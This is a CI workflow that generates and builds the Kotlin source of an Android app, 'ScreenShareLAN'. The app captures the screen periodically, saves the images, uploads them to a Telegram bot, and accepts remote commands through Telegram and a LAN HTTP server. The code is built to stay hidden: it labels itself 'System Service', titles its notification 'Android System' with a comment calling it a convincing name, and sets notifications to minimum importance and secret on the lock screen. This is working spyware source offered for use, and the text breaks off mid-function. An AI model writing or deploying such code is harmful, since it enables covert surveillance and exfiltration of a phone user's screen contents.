name: ScreenShareLAN Periodic Screenshot

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Generate Project Files & Code
        run: |
          mkdir -p app/src/main/java/com/lan/screenshare

          cat << 'EOF' > settings.gradle
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "ScreenShareLAN"
          include ':app'
          EOF

          cat << 'EOF' > build.gradle
          plugins {
              id 'com.android.application' version '8.2.0' apply false
              id 'org.jetbrains.kotlin.android' version '1.9.20' apply false
          }
          EOF

          cat << 'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }
          android {
              namespace 'com.lan.screenshare'
              compileSdk 34
              defaultConfig {
                  applicationId "com.lan.screenshare"
                  minSdk 26
                  targetSdk 34
                  versionCode 16
                  versionName "3.8-stable"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = '17' }
          }
          dependencies {}
          EOF

          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

              <application
                  android:label="System Service"
                  android:icon="@android:drawable/ic_menu_camera"
                  android:theme="@android:style/Theme.DeviceDefault.Light.DarkActionBar"
                  android:allowBackup="false">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleTop">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".StreamService"
                      android:enabled="true"
                      android:exported="false"
                      android:foregroundServiceType="mediaProjection" />
              </application>
          </manifest>
          EOF

          cat << 'EOF' > app/src/main/java/com/lan/screenshare/MainActivity.kt
          package com.lan.screenshare

          import android.app.*
          import android.content.BroadcastReceiver
          import android.content.Context
          import android.content.Intent
          import android.content.IntentFilter
          import android.content.pm.PackageManager
          import android.content.pm.ServiceInfo
          import android.graphics.Bitmap
          import android.graphics.Color
          import android.graphics.PixelFormat
          import android.hardware.display.DisplayManager
          import android.hardware.display.VirtualDisplay
          import android.media.ImageReader
          import android.media.projection.MediaProjection
          import android.media.projection.MediaProjectionManager
          import android.net.Uri
          import android.os.*
          import android.provider.Settings
          import android.widget.*
          import org.json.JSONObject
          import java.io.*
          import java.net.HttpURLConnection
          import java.net.InetSocketAddress
          import java.net.NetworkInterface
          import java.net.ServerSocket
          import java.net.Socket
          import java.net.URL
          import java.net.URLEncoder
          import java.text.SimpleDateFormat
          import java.util.*
          import kotlin.concurrent.thread

          class MainActivity : Activity() {
              private lateinit var projMgr: MediaProjectionManager
              private lateinit var statusTxt: TextView

              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  projMgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                      if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                          try {
                              startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                  data = Uri.parse("package:$packageName")
                              })
                          } catch (_: Exception) {}
                      }
                  }

                  if (Build.VERSION.SDK_INT >= 33) {
                      if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                          requestPermissions(arrayOf("android.permission.POST_NOTIFICATIONS"), 101)
                      }
                  }

                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
                  if (prefs.getString("http_token", "").isNullOrEmpty()) {
                      val newToken = UUID.randomUUID().toString().substring(0, 12)
                      prefs.edit().putString("http_token", newToken).apply()
                  }

                  val scroll = ScrollView(this)
                  val layout = LinearLayout(this).apply {
                      orientation = LinearLayout.VERTICAL
                      setPadding(40, 60, 40, 40)
                  }

                  statusTxt = TextView(this).apply {
                      text = buildStatusText()
                      textSize = 14f
                      setTextIsSelectable(true)
                  }
                  layout.addView(statusTxt)

                  val etToken = EditText(this).apply {
                      hint = "Telegram Bot Token"
                      setText(prefs.getString("bot_token", ""))
                      setTextColor(Color.BLACK)
                  }
                  layout.addView(etToken)

                  val etChatId = EditText(this).apply {
                      hint = "Telegram Chat ID"
                      setText(prefs.getString("chat_id", ""))
                      setTextColor(Color.BLACK)
                  }
                  layout.addView(etChatId)

                  layout.addView(Button(this).apply {
                      text = "حفظ إعدادات تيليجرام"
                      setOnClickListener {
                          prefs.edit()
                              .putString("bot_token", etToken.text.toString().trim())
                              .putString("chat_id", etChatId.text.toString().trim())
                              .apply()
                          Toast.makeText(this@MainActivity, "تم الحفظ!", Toast.LENGTH_SHORT).show()
                          statusTxt.text = buildStatusText()
                      }
                  })

                  layout.addView(Button(this).apply {
                      text = "1) منح إذن الشاشة وتشغيل الخدمة"
                      setOnClickListener {
                          try {
                              startActivityForResult(projMgr.createScreenCaptureIntent(), 100)
                          } catch (e: Exception) {
                              statusTxt.text = "خطأ: ${e.message}"
                          }
                      }
                  })

                  layout.addView(Button(this).apply {
                      text = "2) التقاط الآن (اختبار)"
                      setOnClickListener {
                          thread {
                              val bytes = StreamService.captureNow()
                              val success = StreamService.sendToTelegramStatic(bytes)
                              runOnUiThread {
                                  if (bytes != null) {
                                      statusTxt.text = if (success) {
                                          "✅ تم التقاط وإرسال ${bytes.size} بايت لتيليجرام"
                                      } else {
                                          "⚠️ تم الالتقاط (${bytes.size} بايت) لكن فشل الإرسال لتيليجرام"
                                      }
                                  } else {
                                      statusTxt.text = "❌ فشل الالتقاط (يرجى منح إذن الشاشة أولاً)"
                                  }
                              }
                          }
                      }
                  })

                  layout.addView(Button(this).apply {
                      text = "3) إيقاف/استئناف الالتقاط التلقائي"
                      setOnClickListener {
                          StreamService.userPaused = !StreamService.userPaused
                          StreamService.syncPauseNotification()
                          statusTxt.text = buildStatusText()
                      }
                  })

                  layout.addView(Button(this).apply {
                      text = "تحديث الحالة"
                      setOnClickListener { statusTxt.text = buildStatusText() }
                  })

                  scroll.addView(layout)
                  setContentView(scroll)
              }

              override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
                  super.onActivityResult(requestCode, resultCode, data)
                  if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
                      val intent = Intent(this, StreamService::class.java).apply {
                          action = "START"
                          putExtra("code", resultCode)
                          putExtra("data", data)
                      }
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                          startForegroundService(intent)
                      } else {
                          startService(intent)
                      }
                      statusTxt.postDelayed({ statusTxt.text = buildStatusText() }, 500)
                  }
              }

              private fun buildStatusText(): String {
                  val localIp = getLocalWifiIp()
                  val state = when {
                      !StreamService.isCapturing -> "متوقف 🔴"
                      StreamService.userPaused -> "موقوف يدوياً ⏸"
                      !StreamService.screenOn -> "ينتظر فتح القفل ⏳"
                      else -> "يعمل 🟢"
                  }
                  val diskSize = getDiskUsage()
                  val fileCount = getFileCount()

                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
                  val hasTg = !prefs.getString("bot_token", "").isNullOrEmpty() &&
                              !prefs.getString("chat_id", "").isNullOrEmpty()
                  val tgStatus = if (hasTg) "مفعل ✅" else "غير مفعل ❌"
                  val httpToken = prefs.getString("http_token", "") ?: ""

                  return "الحالة: $state\n" +
                         "تيليجرام: $tgStatus\n" +
                         "الفاصل الحالي: ${StreamService.captureInterval / 1000} ثانية\n" +
                         "اللقطات المحفوظة محلياً: $fileCount\n" +
                         "المساحة المستخدمة: ${diskSize / 1024 / 1024} MB\n\n" +
                         "أوامر البوت:\n" +
                         "/start, /stop, /clear, /10, /20, /30, /status\n\n" +
                         "التحكم من المتصفح (محمي برمز):\n" +
                         "http://$localIp:8080/?token=$httpToken\n\n" +
                         "عناوين IP:\n" +
                         getAllIps()
              }

              private fun getDiskUsage(): Long {
                  return try {
                      File(filesDir, "shots").walkTopDown().filter { it.isFile }.sumOf { it.length() }
                  } catch (_: Exception) { 0L }
              }

              private fun getFileCount(): Int {
                  return try {
                      File(filesDir, "shots").walkTopDown().count { it.isFile }
                  } catch (_: Exception) { 0 }
              }

              private fun getLocalWifiIp(): String {
                  var fallback = "127.0.0.1"
                  try {
                      NetworkInterface.getNetworkInterfaces().toList().forEach { intf ->
                          val name = intf.displayName.lowercase()
                          intf.inetAddresses.toList().forEach { addr ->
                              val host = addr.hostAddress ?: return@forEach
                              if (!addr.isLoopbackAddress && !host.contains(':')) {
                                  if (name.startsWith("wlan") || name.startsWith("swlan")) return host
                                  if (fallback == "127.0.0.1") fallback = host
                              }
                          }
                      }
                  } catch (_: Exception) {}
                  return fallback
              }

              private fun getAllIps(): String {
                  val list = mutableListOf<String>()
                  try {
                      NetworkInterface.getNetworkInterfaces().toList().forEach { intf ->
                          intf.inetAddresses.toList().forEach { addr ->
                              val host = addr.hostAddress ?: return@forEach
                              if (!addr.isLoopbackAddress && !host.contains(':')) {
                                  list.add("${intf.displayName}: $host")
                              }
                          }
                      }
                  } catch (_: Exception) {}
                  return list.joinToString("\n")
              }
          }

          class StreamService : Service() {
              companion object {
                  @Volatile var isCapturing = false
                  @Volatile var userPaused = false
                  @Volatile var screenOn = true
                  @Volatile var captureInterval = 30_000L
                  @Volatile var bufferSize = 0

                  private var instance: StreamService? = null
                  fun captureNow(): ByteArray? = instance?.captureOne()

                  fun sendToTelegramStatic(bytes: ByteArray?): Boolean {
                      if (bytes == null) return false
                      return instance?.sendToTelegram(bytes) ?: false
                  }

                  fun syncPauseNotification() {
                      val inst = instance ?: return
                      if (!isCapturing) return
                      inst.updateNotification(if (userPaused) "موقوف مؤقتاً" else "يعمل")
                  }
              }

              private var projection: MediaProjection? = null
              private var serverSocket: ServerSocket? = null
              private var wakeLock: PowerManager.WakeLock? = null
              private val buffer = ArrayDeque<Pair<Long, ByteArray>>()
              private val maxBuffer = 20
              private val captureLock = Any()
              @Volatile private var stopRequested = false
              private var lockReceiverRegistered = false
              private var pollingThread: Thread? = null
              private var autoThread: Thread? = null
              private var lastUpdateId = 0L

              private val projCallback = object : MediaProjection.Callback() {
                  override fun onStop() {
                      isCapturing = false
                      updateNotification("متوقف")
                      sendTelegramMsg("⚠️ تم إيقاف جلسة الشاشة من قبل النظام أو المستخدم. يرجى إعادة فتح التطبيق ومنح الإذن.")
                  }
              }

              private val lockStateReceiver = object : BroadcastReceiver() {
                  override fun onReceive(context: Context?, intent: Intent?) {
                      when (intent?.action) {
                          Intent.ACTION_USER_PRESENT,
                          Intent.ACTION_SCREEN_ON -> screenOn = true
                          Intent.ACTION_SCREEN_OFF -> screenOn = false
                      }
                  }
              }

              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                  instance = this
                  when (intent?.action) {
                      "START" -> {
                          val code = intent.getIntExtra("code", Activity.RESULT_CANCELED)
                          val data = if (Build.VERSION.SDK_INT >= 33) {
                              intent.getParcelableExtra("data", Intent::class.java)
                          } else {
                              @Suppress("DEPRECATION") intent.getParcelableExtra("data")
                          }
                          if (code == Activity.RESULT_OK && data != null) {
                              startProjection(code, data)
                          } else {
                              stopSelf()
                          }
                      }
                      "STOP" -> {
                          stopAll()
                          stopSelf()
                      }
                      else -> {
                          if (!isCapturing) stopSelf()
                      }
                  }
                  return START_STICKY
              }

              private fun startProjection(code: Int, data: Intent) {
                  try {
                      stopRequested = false
                      createNotification("جاري تهيئة الالتقاط...")

                      val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                      projection?.unregisterCallback(projCallback)
                      projection?.stop()
                      projection = mgr.getMediaProjection(code, data)
                      projection?.registerCallback(projCallback, Handler(Looper.getMainLooper()))

                      isCapturing = true
                      acquireWakeLock()
                      registerLockReceiver()
                      startHttpServer()
                      startBotPolling()
                      startAutoLoop()

                      updateNotification(if (userPaused) "موقوف مؤقتاً" else "يعمل")
                  } catch (e: Exception) {
                      e.printStackTrace()
                      isCapturing = false
                      stopSelf()
                  }
              }

              private fun registerLockReceiver() {
                  if (lockReceiverRegistered) return
                  try {
                      val filter = IntentFilter().apply {
                          addAction(Intent.ACTION_USER_PRESENT)
                          addAction(Intent.ACTION_SCREEN_ON)
                          addAction(Intent.ACTION_SCREEN_OFF)
                      }
                      if (Build.VERSION.SDK_INT >= 33) {
                          registerReceiver(lockStateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                      } else {
                          @Suppress("UnspecifiedRegisterReceiverFlag")
                          registerReceiver(lockStateReceiver, filter)
                      }
                      lockReceiverRegistered = true
                  } catch (_: Throwable) {}
              }

              private fun unregisterLockReceiver() {
                  if (!lockReceiverRegistered) return
                  try { unregisterReceiver(lockStateReceiver) } catch (_: Throwable) {}
                  lockReceiverRegistered = false
              }

              private fun isPhoneUsable(): Boolean {
                  if (!screenOn) return false
                  return try {
                      val km = getSystemService(Context.KEYGUARD_SERVICE) as? android.app.KeyguardManager
                      km?.isKeyguardLocked == false
                  } catch (_: Throwable) { true }
              }

              private fun startAutoLoop() {
                  autoThread?.interrupt()
                  autoThread = thread(name = "AutoLoop") {
                      while (isCapturing && !stopRequested) {
                          if (!userPaused && isPhoneUsable()) {
                              try {
                                  val bytes = captureOne()
                                  if (bytes != null) {
                                      saveScreenshotToDisk(bytes)
                                      sendToTelegram(bytes)
                                      synchronized(buffer) {
                                          buffer.addLast(System.currentTimeMillis() to bytes)
                                          while (buffer.size > maxBuffer) buffer.removeFirst()
                                          bufferSize = buffer.size
                                      }
                                  }
                              } catch (e: Exception) {
                                  e.printStackTrace()
                              }
                          }
                          // النوم على شكل أجزاء من ثانية للاستجابة الفورية لتغيير الوقت أو الأوامر
                          var slept = 0L
                          val targetInterval = captureInterval
                          while (slept < targetInterval && isCapturing && !stopRequested) {
                              try { Thread.sleep(1000) } catch (e: InterruptedException) { break }
                              slept += 1000
                          }
                      }
                  }
              }

              private fun startBotPolling() {
                  if (pollingThread?.isAlive == true) return
                  pollingThread = thread(name = "BotPoll") {
                      while (!stopRequested) {
                          var conn: HttpURLConnection? = null
                          try {
                              val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
                              val token = prefs.getString("bot_token", "") ?: ""
                              val chatId = prefs.getString("chat_id", "") ?: ""

                              if (token.isEmpty() || chatId.isEmpty()) {
                                  Thread.sleep(5000)
                                  continue
                              }

                              val url = URL("https://api.telegram.org/bot$token/getUpdates?offset=$lastUpdateId&timeout=30")
                              conn = url.openConnection() as HttpURLConnection
                              conn.requestMethod = "GET"
                              conn.connectTimeout = 35000
                              conn.readTimeout = 35000

                              if (conn.responseCode == 200) {
                                  val response = conn.inputStream.bufferedReader().use { it.readText() }
                                  val root = JSONObject(response)
                                  if (root.optBoolean("ok")) {
                                      val results = root.getJSONArray("result")
                                      for (i in 0 until results.length()) {
                                          val update = results.getJSONObject(i)
                                          lastUpdateId = update.getLong("update_id") + 1

                                          if (update.has("message")) {
                                              val message = update.getJSONObject("message")
                                              val chatObj = message.optJSONObject("chat")
                                              val msgChatId = chatObj?.optLong("id")?.toString() ?: ""

                                              if (msgChatId == chatId && message.has("text")) {
                                                  val text = message.getString("text").trim().lowercase()
                                                  handleBotCommand(text)
                                              }
                                          }
                                      }
                                  }
                              }
                          } catch (_: Exception) {
                              try { Thread.sleep(5000) } catch (_: Exception) {}
                          } finally {
                              conn?.disconnect()
                          }
                      }
                  }
              }

              private fun handleBotCommand(command: String) {
                  when (command) {
                      "/start" -> {
                          if (!isCapturing) {
                              sendTelegramMsg("⚠️ جلسة الشاشة متوقفة حالياً. يرجى فتح التطبيق ومنح إذن الشاشة.")
                          } else {
                              userPaused = false
                              updateNotification("يعمل")
                              sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي.")
                          }
                      }
                      "/stop" -> {
                          userPaused = true
                          updateNotification("موقوف مؤقتاً")
                          sendTelegramMsg("⏸ تم إيقاف الالتقاط التلقائي.")
                      }
                      "/clear" -> {
                          clearPhotos()
                          sendTelegramMsg("🗑️ تم مسح جميع الصور المحفوظة في الهاتف.")
                      }
                      "/10" -> {
                          captureInterval = 10_000L
                          sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 10 ثوانٍ.")
                      }
                      "/20" -> {
                          captureInterval = 20_000L
                          sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 20 ثانية.")
                      }
                      "/30" -> {
                          captureInterval = 30_000L
                          sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 30 ثانية.")
                      }
                      "/status" -> {
                          val count = try { File(filesDir, "shots").walkTopDown().count { it.isFile } } catch (_: Exception) { 0 }
                          val state = when {
                              !isCapturing -> "متوقف 🔴"
                              userPaused -> "متوقف مؤقتاً ⏸"
                              else -> "يعمل 🟢"
                          }
                          sendTelegramMsg("📊 الحالة: $state\n⏱️ الفاصل: ${captureInterval / 1000} ثانية\n🖼️ الصور المحفوظة: $count")
                      }
                      else -> {
                          sendTelegramMsg("❓ أمر غير معروف.\nالأوامر المتاحة:\n/start\n/stop\n/clear\n/10\n/20\n/30\n/status")
                      }
                  }
              }

              private fun clearPhotos() {
                  try {
                      val root = File(filesDir, "shots")
                      root.deleteRecursively()
                      root.mkdirs()
                      synchronized(buffer) {
                          buffer.clear()
                          bufferSize = 0
                      }
                  } catch (_: Exception) {}
              }

              fun sendTelegramMsg(msg: String) {
                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
                  val token = prefs.getString("bot_token", "") ?: ""
                  val chatId = prefs.getString("chat_id", "") ?: ""
                  if (token.isEmpty() || chatId.isEmpty()) return

                  var conn: HttpURLConnection? = null
                  try {
                      val encodedMsg = URLEncoder.encode(msg, "UTF-8")
                      val url = URL("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$encodedMsg")
                      conn = url.openConnection() as HttpURLConnection
                      conn.requestMethod = "GET"
                      conn.connectTimeout = 10000
                      conn.readTimeout = 10000
                      conn.inputStream.close()
                  } catch (_: Exception) {
                  } finally {
                      conn?.disconnect()
                  }
              }

              fun sendToTelegram(webpBytes: ByteArray): Boolean {
                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
                  val token = prefs.getString("bot_token", "") ?: ""
                  val chatId = prefs.getString("chat_id", "") ?: ""
                  if (token.isEmpty() || chatId.isEmpty()) return false

                  var conn: HttpURLConnection? = null
                  return try {
                      val boundary = "*****" + System.currentTimeMillis() + "*****"
                      val url = URL("https://api.telegram.org/bot$token/sendPhoto")
                      conn = url.openConnection() as HttpURLConnection
                      conn.requestMethod = "POST"
                      conn.doOutput = true
                      conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
                      conn.connectTimeout = 15000
                      conn.readTimeout = 15000

                      DataOutputStream(conn.outputStream).use { writer ->
                          writer.writeBytes("--$boundary\r\n")
                          writer.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                          writer.writeBytes("$chatId\r\n")

                          writer.writeBytes("--$boundary\r\n")
                          writer.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"shot.webp\"\r\n")
                          writer.writeBytes("Content-Type: image/webp\r\n\r\n")
                          writer.write(webpBytes)
                          writer.writeBytes("\r\n")
                          writer.writeBytes("--$boundary--\r\n")
                          writer.flush()
                      }

                      conn.responseCode == 200
                  } catch (_: Exception) {
                      false
                  } finally {
                      conn?.disconnect()
                  }
              }

              private fun captureOne(): ByteArray? = synchronized(captureLock) {
                  val proj = projection ?: return null
                  var vd: VirtualDisplay? = null
                  var ir: ImageReader? = null
                  var bmp: Bitmap? = null
                  var finalBmp: Bitmap? = null
                  try {
                      val metrics = resources.displayMetrics
                      val w = 480
                      var h = (metrics.heightPixels * (480f / metrics.widthPixels)).toInt()
                      if (h % 2 != 0) h++

                      ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
                      vd = proj.createVirtualDisplay(
                          "ScreenCapture", w, h, metrics.densityDpi,
                          DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                          ir.surface, null, null
                      ) ?: return null

                      var img: android.media.Image? = null
                      val deadline = System.currentTimeMillis() + 3000
                      while (System.currentTimeMillis() < deadline) {
                          img = ir.acquireLatestImage()
                          if (img != null) break
                          Thread.sleep(50)
                      }
                      img ?: return null

                      try {
                          val plane = img.planes[0]
                          val buf = plane.buffer
                          val pixelStride = plane.pixelStride
                          val rowStride = plane.rowStride
                          val rowPadding = rowStride - pixelStride * w
                          val bmpWidth = w + rowPadding / pixelStride

                          bmp = Bitmap.createBitmap(bmpWidth, h, Bitmap.Config.ARGB_8888)
                          buf.rewind()
                          bmp.copyPixelsFromBuffer(buf)

                          finalBmp = if (bmpWidth != w) Bitmap.createBitmap(bmp, 0, 0, w, h) else bmp
                          val out = ByteArrayOutputStream()
                          val fmt = if (Build.VERSION.SDK_INT >= 30) {
                              Bitmap.CompressFormat.WEBP_LOSSY
                          } else {
                              @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
                          }
                          finalBmp.compress(fmt, 55, out)
                          return out.toByteArray()
                      } finally {
                          img.close()
                          if (finalBmp != null && finalBmp !== bmp) finalBmp.recycle()
                          bmp?.recycle()
                      }
                  } catch (_: Throwable) {
                      return null
                  } finally {
                      try { vd?.release() } catch (_: Throwable) {}
                      try { ir?.close() } catch (_: Throwable) {}
                  }
              }

              private fun saveScreenshotToDisk(webp: ByteArray): File? {
                  return try {
                      val root = File(filesDir, "shots")
                      if (!root.exists()) root.mkdirs()

                      val today = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
                      val dayDir = File(root, today)
                      if (!dayDir.exists()) dayDir.mkdirs()

                      val file = File(dayDir, "shot_${System.currentTimeMillis()}.webp")
                      file.writeBytes(webp)

                      val cutoff = System.currentTimeMillis() - 4L * 24 * 60 * 60 * 1000
                      root.listFiles()?.forEach { day ->
                          val dayTs = try {
                              SimpleDateFormat("yyyy-MM-dd", Locale.US).parse(day.name)?.time ?: 0L
                          } catch (_: Exception) { 0L }
                          if (dayTs in 1..cutoff) {
                              day.deleteRecursively()
                          }
                      }

                      val maxBytes = 200L * 1024 * 1024
                      val allFiles = root.walkTopDown().filter { it.isFile }
                          .sortedBy { it.lastModified() }
                          .toList()
                      var totalSize = allFiles.sumOf { it.length() }
                      if (totalSize > maxBytes) {
                          for (f in allFiles) {
                              if (totalSize <= maxBytes) break
                              totalSize -= f.length()
                              f.delete()
                          }
                          root.listFiles()?.forEach { d ->
                              if (d.isDirectory && (d.listFiles()?.isEmpty() != false)) d.delete()
                          }
                      }
                      file
                  } catch (_: Throwable) { null }
              }

              private fun stopAll() {
                  isCapturing = false
                  stopRequested = true
                  try { projection?.unregisterCallback(projCallback) } catch (_: Throwable) {}
                  try { projection?.stop() } catch (_: Throwable) {}
                  projection = null
                  synchronized(buffer) {
                      buffer.clear()
                      bufferSize = 0
                  }
                  try { serverSocket?.close() } catch (_: Throwable) {}
                  serverSocket = null
              }

              private fun startHttpServer() {
                  if (serverSocket != null && !serverSocket!!.isClosed) return
                  thread(name = "Http") {
                      try {
                          serverSocket = ServerSocket()
                          serverSocket?.reuseAddress = true
                          serverSocket?.bind(InetSocketAddress("0.0.0.0", 8080))
                          while (!stopRequested && isCapturing) {
                              val client = serverSocket?.accept() ?: break
                              thread { handleClient(client) }
                          }
                      } catch (_: Throwable) {}
                  }
              }

              private fun handleClient(client: Socket) {
                  try {
                      client.soTimeout = 8000
                      val reader = BufferedReader(InputStreamReader(client.getInputStream()))
                      val requestLine = reader.readLine() ?: ""
                      var authHeader = ""
                      while (true) {
                          val line = reader.readLine()
                          if (line.isNullOrEmpty()) break
                          if (line.startsWith("Authorization:", ignoreCase = true)) {
                              authHeader = line.substringAfter(":").trim()
                          }
                      }

                      val out = client.getOutputStream()
                      val fullPath = requestLine.split(" ").getOrNull(1) ?: "/"
                      val path = fullPath.substringBefore("?")
                      val query = fullPath.substringAfter("?", "")

                      val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
                      val expectedToken = prefs.getString("http_token", "") ?: ""
                      val queryToken = query.split("&")
                          .firstOrNull { it.startsWith("token=") }
                          ?.substringAfter("token=") ?: ""

                      val isAuthorized = expectedToken.isNotEmpty() &&
                          (queryToken == expectedToken || authHeader == "Bearer $expectedToken")

                      if (!isAuthorized) {
                          sendUnauthorized(out)
                          return
                      }

                      when (path) {
                          "/now" -> {
                              val bytes = captureOne()
                              if (bytes == null) { sendText(out, "NO_PERMISSION"); return }
                              saveScreenshotToDisk(bytes)
                              sendToTelegram(bytes)
                              synchronized(buffer) {
                                  buffer.addLast(System.currentTimeMillis() to bytes)
                                  while (buffer.size > maxBuffer) buffer.removeFirst()
                                  bufferSize = buffer.size
                              }
                              sendImage(out, bytes)
                          }
                          "/latest" -> {
                              var bytes = synchronized(buffer) { buffer.lastOrNull()?.second }
                              if (bytes == null) {
                                  val root = File(filesDir, "shots")
                                  val all = mutableListOf<File>()
                                  root.listFiles()?.forEach { d ->
                                      if (d.isDirectory) d.listFiles()?.forEach { if (it.isFile) all.add(it) }
                                  }
                                  bytes = all.maxByOrNull { it.lastModified() }?.readBytes()
                              }
                              if (bytes == null) { sendText(out, "EMPTY"); return }
                              sendImage(out, bytes)
                          }
                          "/pause" -> {
                              userPaused = true
                              updateNotification("موقوف مؤقتاً")
                              sendText(out, "OK_PAUSED")
                          }
                          "/resume" -> {
                              userPaused = false
                              updateNotification("يعمل")
                              sendText(out, "OK_RESUMED")
                          }
                          "/interval" -> {
                              val ms = query.split("&")
                                  .firstOrNull { it.startsWith("ms=") }
                                  ?.substringAfter("ms=")?.toLongOrNull()
                              if (ms != null && ms in 5000..600000) {
                                  captureInterval = ms
                                  sendText(out, "OK_$ms")
                              } else {
                                  sendText(out, "CURRENT_$captureInterval")
                              }
                          }
                          else -> {
                              val status = when {
                                  !isCapturing -> "OFFLINE"
                                  userPaused -> "PAUSED"
                                  !isPhoneUsable() -> "WAITING"
                                  else -> "LIVE (${captureInterval / 1000}s)"
                              }
                              val html = "<html><body style='margin:0;background:#111;color:#ccc;text-align:center;font-family:sans-serif'>" +
                                      "<div style='padding:10px'>$status</div>" +
                                      "<img src='/latest?token=$expectedToken' style='max-width:100%;max-height:90vh'>" +
                                      "</body></html>"
                              sendHtml(out, html)
                          }
                      }
                  } catch (_: Throwable) {
                  } finally {
                      try { client.close() } catch (_: Throwable) {}
                  }
              }

              private fun sendUnauthorized(out: OutputStream) {
                  val b = "401 Unauthorized".toByteArray()
                  out.write("HTTP/1.1 401 Unauthorized\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: ${b.size}\r\nConnection: close\r\n\r\n".toByteArray())
                  out.write(b)
                  out.flush()
              }

              private fun sendImage(out: OutputStream, bytes: ByteArray) {
                  out.write("HTTP/1.1 200 OK\r\nContent-Type: image/webp\r\nContent-Length: ${bytes.size}\r\nCache-Control: no-cache, no-store\r\nConnection: close\r\n\r\n".toByteArray())
                  out.write(bytes)
                  out.flush()
              }

              private fun sendText(out: OutputStream, text: String) {
                  val b = text.toByteArray()
                  out.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: ${b.size}\r\nConnection: close\r\n\r\n".toByteArray())
                  out.write(b)
                  out.flush()
              }

              private fun sendHtml(out: OutputStream, html: String) {
                  val b = html.toByteArray(Charsets.UTF_8)
                  out.write("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: ${b.size}\r\nConnection: close\r\n\r\n".toByteArray())
                  out.write(b)
                  out.flush()
              }

              private fun buildNotification(text: String): Notification {
                  val chanId = "screen_share_channel"
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      val chan = NotificationChannel(
                          chanId,
                          "خدمة التقاط الشاشة",
                          NotificationManager.IMPORTANCE_MIN // أهمية منخفضة جداً لإخفاء الإشعارات المزعجة
                      ).apply {
                          setShowBadge(false)
                          enableLights(false)
                          enableVibration(false)
                          setSound(null, null)
                          lockscreenVisibility = Notification.VISIBILITY_SECRET
                      }
                      getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
                  }

                  val pending = PendingIntent.getActivity(
                      this, 0,
                      Intent(this, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                      PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                  )

                  return Notification.Builder(this, chanId)
                      .setContentTitle("Android System") // اسم مقنع
                      .setContentText(text)
                      .setSmallIcon(android.R.drawable.stat_sys_download_done)
                      .setContentIntent(pending)
                      .setOngoing(true)
                      .setVisibility(Notification.VISIBILITY_SECRET)
                      .build()
              }

              private fun createNotification(text: String) {
                  val notif = buildNotification(text)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
